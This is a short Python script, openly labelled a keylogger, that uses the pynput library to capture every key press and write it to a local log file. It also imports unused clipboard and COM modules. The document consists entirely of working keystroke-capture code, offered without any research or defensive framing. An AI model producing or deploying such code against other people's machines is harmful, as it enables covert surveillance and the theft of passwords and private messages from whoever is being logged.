import pythoncom
from pynput import keyboard
import win32clipboard
import logging

# Define the logger
log_file = 'keylogger.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

# Define the keylogger function
def on_press(key):
    try:
        logging.info(f'Key {key.char}')
    except AttributeError:
        logging.info(f'Special Key {key}')

# Create a listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()